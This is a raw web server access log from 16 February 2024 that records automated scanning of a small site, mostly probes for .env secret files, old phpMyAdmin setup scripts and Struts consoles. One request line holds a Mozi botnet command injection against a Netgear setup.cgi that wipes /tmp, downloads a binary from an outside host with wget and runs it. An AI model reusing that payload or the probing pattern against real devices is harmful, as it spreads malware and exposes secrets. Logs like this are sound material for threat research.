192.241.196.106 - - [16/Feb/2024:00:18:17 +0000] "GET /portal/redlion HTTP/1.1" 404 769
185.254.196.173 - - [16/Feb/2024:00:18:25 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [16/Feb/2024:00:18:26 +0000] "POST / HTTP/1.1" 200 3979
135.125.246.110 - - [16/Feb/2024:00:27:33 +0000] "GET /.env HTTP/1.1" 404 755
135.125.246.110 - - [16/Feb/2024:00:27:34 +0000] "POST / HTTP/1.1" 200 3979
78.153.140.177 - - [16/Feb/2024:00:39:16 +0000] "GET /.env HTTP/1.1" 404 755
78.153.140.177 - - [16/Feb/2024:00:39:17 +0000] "-" 400 2061
139.162.84.205 - - [16/Feb/2024:00:44:48 +0000] "GET / HTTP/1.0" 200 3979
185.161.248.148 - - [16/Feb/2024:00:54:29 +0000] "-" 400 2019
185.180.143.49 - - [16/Feb/2024:01:02:37 +0000] "GET / HTTP/1.1" 200 3979
45.79.181.179 - - [16/Feb/2024:01:28:30 +0000] "-" 400 2217
64.62.197.42 - - [16/Feb/2024:01:33:17 +0000] "-" 400 2827
198.235.24.147 - - [16/Feb/2024:01:45:28 +0000] "-" 400 2187
198.235.24.147 - - [16/Feb/2024:01:45:28 +0000] "-" 400 3407
185.254.196.173 - - [16/Feb/2024:01:45:46 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [16/Feb/2024:01:45:47 +0000] "POST / HTTP/1.1" 200 3979
59.89.200.102 - - [16/Feb/2024:02:31:16 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.89.200.102:51169/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 760
185.254.196.173 - - [16/Feb/2024:02:37:16 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [16/Feb/2024:02:37:17 +0000] "POST / HTTP/1.1" 200 3979
135.125.246.110 - - [16/Feb/2024:02:50:31 +0000] "GET /.env HTTP/1.1" 404 755
135.125.246.110 - - [16/Feb/2024:02:50:32 +0000] "POST / HTTP/1.1" 200 3979
135.125.246.110 - - [16/Feb/2024:03:21:02 +0000] "GET /.env HTTP/1.1" 404 755
135.125.246.110 - - [16/Feb/2024:03:21:03 +0000] "POST / HTTP/1.1" 200 3979
107.170.239.33 - - [16/Feb/2024:03:36:42 +0000] "GET /actuator/health HTTP/1.1" 404 770
68.183.180.201 - - [16/Feb/2024:03:36:56 +0000] "-" 400 2851
68.183.180.201 - - [16/Feb/2024:03:36:56 +0000] "-" 400 2833
68.183.180.201 - - [16/Feb/2024:03:36:56 +0000] "GET / HTTP/1.1" 200 3979
68.183.180.201 - - [16/Feb/2024:03:36:56 +0000] "-" 400 2833
194.67.201.24 - - [16/Feb/2024:03:45:11 +0000] "GET / HTTP/1.1" 200 3979
194.67.201.24 - - [16/Feb/2024:03:45:32 +0000] "GET /js/swipebox.js HTTP/1.1" 200 1050
40.117.148.149 - - [16/Feb/2024:03:59:34 +0000] "-" 400 2077
34.78.6.216 - - [16/Feb/2024:04:04:02 +0000] "GET / HTTP/1.1" 200 3979
118.26.36.40 - - [16/Feb/2024:04:05:56 +0000] "GET / HTTP/1.1" 200 3979
118.26.36.40 - - [16/Feb/2024:04:05:57 +0000] "GET /favicon.ico HTTP/1.1" 404 762
118.26.36.40 - - [16/Feb/2024:04:05:57 +0000] "GET /img/logo.png HTTP/1.1" 200 5124
118.26.36.40 - - [16/Feb/2024:04:05:57 +0000] "GET /js/swipebox.js HTTP/1.1" 200 1050
118.26.36.40 - - [16/Feb/2024:04:05:58 +0000] "GET /robots.txt HTTP/1.1" 404 761
118.26.36.40 - - [16/Feb/2024:04:05:58 +0000] "GET /sitemap.xml HTTP/1.1" 404 762
118.26.36.40 - - [16/Feb/2024:04:05:58 +0000] "GET null HTTP/1.1" 400 2039
118.26.36.40 - - [16/Feb/2024:04:05:59 +0000] "GET /struts/webconsole.html HTTP/1.1" 404 777
118.26.36.40 - - [16/Feb/2024:04:06:00 +0000] "GET /?actionErrors=1111 HTTP/1.1" 200 3979
118.26.36.40 - - [16/Feb/2024:04:06:00 +0000] "GET /invoker/readonly HTTP/1.1" 404 771
185.254.196.173 - - [16/Feb/2024:04:07:52 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [16/Feb/2024:04:07:53 +0000] "POST / HTTP/1.1" 200 3979
139.162.84.205 - - [16/Feb/2024:04:37:33 +0000] "GET / HTTP/1.0" 200 3979
162.216.149.84 - - [16/Feb/2024:05:07:31 +0000] "GET / HTTP/1.1" 200 3979
46.174.191.32 - - [16/Feb/2024:05:18:30 +0000] "GET / HTTP/1.0" 200 3979
184.105.139.70 - - [16/Feb/2024:05:30:05 +0000] "-" 400 2173
172.105.128.13 - - [16/Feb/2024:05:40:45 +0000] "-" 400 2127
185.254.196.173 - - [16/Feb/2024:05:47:45 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [16/Feb/2024:05:47:45 +0000] "POST / HTTP/1.1" 200 3979
180.184.171.155 - - [16/Feb/2024:05:50:25 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.0" 404 787
180.184.171.155 - - [16/Feb/2024:05:50:25 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 787
180.184.171.155 - - [16/Feb/2024:05:50:26 +0000] "GET /phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 794
180.184.171.155 - - [16/Feb/2024:05:50:27 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.0" 404 787
180.184.171.155 - - [16/Feb/2024:05:50:28 +0000] "GET /phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 794
180.184.171.155 - - [16/Feb/2024:05:50:28 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 787
180.184.171.155 - - [16/Feb/2024:05:50:28 +0000] "GET /phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 796
180.184.171.155 - - [16/Feb/2024:05:50:29 +0000] "GET /phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 794
180.184.171.155 - - [16/Feb/2024:05:50:29 +0000] "GET /phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 794
180.184.171.155 - - [16/Feb/2024:05:50:30 +0000] "GET /phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 794
180.184.171.155 - - [16/Feb/2024:05:50:30 +0000] "GET /phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 796
180.184.171.155 - - [16/Feb/2024:05:50:31 +0000] "GET /phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 794
180.184.171.155 - - [16/Feb/2024:05:50:31 +0000] "GET /phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 795
180.184.171.155 - - [16/Feb/2024:05:50:31 +0000] "GET /phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 795
180.184.171.155 - - [16/Feb/2024:05:50:32 +0000] "GET /phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 794
180.184.171.155 - - [16/Feb/2024:05:50:32 +0000] "GET /phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 794
180.184.171.155 - - [16/Feb/2024:05:50:33 +0000] "GET /phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 796
180.184.171.155 - - [16/Feb/2024:05:50:33 +0000] "GET /phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 404 794
180.184.171.155 - - [16/Feb/2024:05:50:34 +0000] "GET /phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 796
